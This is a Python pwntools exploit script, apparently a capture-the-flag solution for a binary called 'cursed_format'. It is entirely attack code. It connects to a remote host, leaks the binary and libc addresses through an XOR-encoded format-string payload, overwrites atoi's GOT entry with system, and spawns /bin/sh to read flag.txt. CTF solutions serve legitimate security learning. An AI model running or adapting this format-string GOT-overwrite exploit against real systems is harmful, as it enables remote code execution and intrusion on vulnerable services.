#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './cursed_format')
libc = ELF(exe.libc.path)

def sendpayload(payload): io.sendlineafter(b">> ", b"1"); io.send(payload)
def precurse(payload, key):
    payload = payload.ljust(0x20, b'\x00')[:0x20]
    precursed = bytes([payload[i] ^ key[i] for i in range(0x20)])
    return precursed, payload

while True:
    try:
        io = remote("18.212.136.134", 8887)

        payload, key = precurse(b'%16$lx\n%17$lx\n', b'\xff'*0x20)
        sendpayload(payload)

        exe.address  = int(io.recvline().strip().decode(), 16) - 5040
        libc.address = int(io.recvline().strip().decode(), 16) - 146810

        if (libc.sym.system >> 16) == (libc.sym.atoi >> 16):
            payload = f"%{libc.sym.system & 0xffff}x".encode() + b"%9$hn"
            payload = payload.ljust(0x18, b' ') + p64(exe.got.atoi)
            payload, _ = precurse(payload, key)
            sendpayload(payload)
            io.sendline(b'/bin/sh\x00')
            break
        else: io.close()
    except Exception: pass

io.sendlineafter(b">> ", b"cat flag.txt && echo")
io.interactive()
